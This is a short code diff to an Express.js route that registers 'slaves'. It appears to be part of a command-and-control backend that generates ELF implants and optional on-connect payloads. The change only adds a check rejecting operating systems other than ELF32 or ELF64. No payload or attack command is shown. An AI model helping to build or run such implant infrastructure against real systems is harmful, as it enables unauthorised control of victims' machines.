@@ -41,6 +41,12 @@ router.post("/slaves", userMiddleware.checkNewGeneration, (req, res) => {
     // Create new slave ID.
     const slaveId = cryptoHelper.createID();
 
+    // Coming soon...
+    if (newSlave.os != "ELF32" && newSlave.os != "ELF64") {
+            res.status(400).json({message: "Only ELF implants available currently! Support for other OS's coming soon."})
+            return
+    }
+
     // Check if there is an onconnect payload.
     if (newSlave.payload) {
 
